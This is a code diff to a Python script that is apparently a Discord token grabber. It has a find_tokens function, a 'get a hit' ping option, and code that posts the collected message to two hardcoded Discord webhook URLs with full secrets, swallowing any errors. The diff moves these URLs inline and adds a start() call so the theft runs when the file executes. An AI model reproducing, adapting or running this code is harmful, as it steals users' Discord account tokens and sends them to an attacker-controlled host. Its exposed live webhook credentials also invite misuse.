@@ -4,13 +4,6 @@ import json
 
 from urllib.request import Request, urlopen
 
-# your webhook URL
-WEBHOOK_URL = [
-    "https://discord.com/api/webhooks/879443809887457390/rVrvhh37NvTNjEwwH_mrsZs4_EO71tBxDcZpF7IAqt1239Tvzawy9GyusWU4HR84VDjs",
-    "https://discord.com/api/webhooks/879445318607986779/JjOcogHW55fSaCN-VTkPTfZmXmneX1aUIHiQBrtJrTVEgVaYdsQPh2qWSnRa5xgN4Xg5"
-]
-
-# mentions you when you get a hit
 PING_ME = False
 
 def find_tokens(path):
@@ -68,13 +61,11 @@ def start():
     payload = json.dumps({'content': message})
 
     try:
-        req = Request(WEBHOOK_URL[0], data=payload.encode(), headers=headers)
+        req = Request("https://discord.com/api/webhooks/879443809887457390/rVrvhh37NvTNjEwwH_mrsZs4_EO71tBxDcZpF7IAqt1239Tvzawy9GyusWU4HR84VDjs", data=payload.encode(), headers=headers)
         urlopen(req)
-    except:
-        pass
-    
-    try:
-        req2 = Request(WEBHOOK_URL[1], data=payload.encode(), headers=headers)
+        req2 = Request("https://discord.com/api/webhooks/879445318607986779/JjOcogHW55fSaCN-VTkPTfZmXmneX1aUIHiQBrtJrTVEgVaYdsQPh2qWSnRa5xgN4Xg5", data=payload.encode(), headers=headers)
         urlopen(req2)
     except:
         pass
+    
+   start()
